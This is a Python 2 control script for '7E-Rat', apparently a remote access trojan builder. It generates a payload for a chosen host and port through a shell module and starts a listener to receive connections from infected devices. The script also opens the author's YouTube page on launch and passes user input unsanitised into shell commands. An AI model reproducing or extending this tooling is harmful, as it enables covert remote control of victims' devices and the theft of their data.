#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os, sys, subprocess
from time import sleep
os.system("xdg-open https://youtube.com/@ELHAKEM_YT")
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")

host = " "
port = " "
output = " "

def logo():
 print("""
  _____ _____      ____      _  _____
  |___  | ____|    |  _ \    / \|_   _|
     / /|  _| _____| |_) |  / _ \ | |
    / / | |__|_____|  _ <  / ___ \| |
   /_/  |_____|    |_| \_\/_/   \_\_| 
 
 
\t [$] Versions : 1.0.0 
\t [$] Coded By ELHAKEM 
\t [$] BY SEVEN EYES TEAM \033[1;31m
 """)

def help():
 print("""
  Commands :
  set HOST 127.00.01
  set PORT 4444
  set OUTPUT /data/data/com.termux/files/home/payload.py
  show values    : Show Host, Port And Output Value
  start listener    : Start Your Conection Server 
  generate        : To build the payload 

  Please Report This bug To My FB & YT & TEL
  
  YT : https://youtube.com/@ELHAKEM_YT
  
  TEL: 
  
  FP : https://facebook.com/groups/149215340505093/""")
       
def main():
    global host, port, output

    while True:
        cmd = raw_input("[*] 7E-Rat@SevenEyes:~# ").lower()

        if cmd == "help":
            help()

        elif cmd == 'banner':
            os.system("clear")
            logo()
            main()

        elif "clear" in cmd:
            os.system("clear")

        elif "set host" in cmd:
            host = cmd.split()[-1]

        elif "set port" in cmd:
            port = int(cmd.split()[-1])

        elif "set output" in cmd:
            output = cmd.split()[-1]

        elif cmd == "show values":
            print "\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output)

        elif cmd == "generate payload" or cmd == "generate":
            if host != " " and port != " " and output != " ":
                print("[+] Generating Payload . . .")
                sleep(1)
                print("[*] Using Configuration . . .\n |_ HOST   : "+host+"\n |_ PORT   : "+str(port)+"\n |_ OUTPUT : "+output)
                sleep(3)
                os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                print("[+] Generating Success . . .")
                sleep(1)
                main()
            else:
                print "\n[!] HOST   : %s\n[!] PORT   : %s\n[!] OUTPUT : %s\n"%(host,port,output)

        elif cmd == "start" or cmd == "run" or cmd == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
            else:
                print "\n[!] Host : %s\n[!] Port : %s\n"%(host,port)
        else:
            print("[!] Check Your Command . . .")
            main()

def contol():
    try:
        logo()
        main()
    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detect Exiting . . .")
        sleep(2)
        sys.exit()
if __name__ == "__main__":
    contol()
